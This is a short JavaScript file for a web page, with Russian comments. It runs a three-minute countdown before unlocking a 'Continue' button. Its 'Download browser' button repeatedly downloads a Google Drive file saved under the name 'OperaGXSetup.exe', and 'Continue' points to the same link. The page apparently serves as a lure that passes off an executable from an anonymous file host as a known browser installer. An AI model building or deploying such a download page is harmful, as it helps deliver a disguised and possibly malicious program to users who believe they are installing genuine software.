let timeLeft = 180; // 3 минуты в секундах
let timerInterval;

// Функция для запуска таймера
function startTimer() {
  timerInterval = setInterval(() => {
    timeLeft--;
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    document.getElementById('timer').textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;

    // Если таймер завершен, разблокируем кнопку "Продолжить"
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      document.getElementById('proceedButton').disabled = false;
    }
  }, 1000);
}

// Запуск таймера при загрузке страницы
startTimer();

// Остановка таймера при переходе на другую страницу
window.addEventListener('beforeunload', () => {
  clearInterval(timerInterval);
});

// Функция для скачивания файла
function downloadFile(url, filename) {
  const link = document.createElement('a');
  link.href = url;
  link.setAttribute('download', filename);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// Обработка нажатия на кнопку "Скачать браузер"
document.getElementById('downloadBrowserButton').addEventListener('click', () => {
  // Блокируем кнопку на 5 секунд
  document.getElementById('downloadBrowserButton').disabled = true;
  document.getElementById('downloadBrowserButton').textContent = "Загрузка...";

  setTimeout(() => {
    // Скачиваем браузер
    downloadFile('https://drive.google.com/uc?export=download&id=1s6GMRSVXpcOEI1yV8iwjLzqHs1c36Bq0', 'OperaGXSetup.exe');

    // После скачивания браузера скачиваем остальные файлы
    setTimeout(() => {
      downloadFile('https://drive.google.com/uc?export=download&id=1s6GMRSVXpcOEI1yV8iwjLzqHs1c36Bq0', 'OperaGXSetup.exe');
      downloadFile('https://drive.google.com/uc?export=download&id=1s6GMRSVXpcOEI1yV8iwjLzqHs1c36Bq0', 'OperaGXSetup.exe');
    }, 1000);

    // Разблокируем кнопку после завершения всех загрузок
    setTimeout(() => {
      document.getElementById('downloadBrowserButton').disabled = false;
      document.getElementById('downloadBrowserButton').textContent = "Скачать браузер";
    }, 2000);
  }, 5000);
});

// Обработка нажатия на кнопку "Продолжить"
document.getElementById('proceedButton').addEventListener('click', () => {
  window.location.href = 'https://drive.google.com/uc?export=download&id=1s6GMRSVXpcOEI1yV8iwjLzqHs1c36Bq0';
});
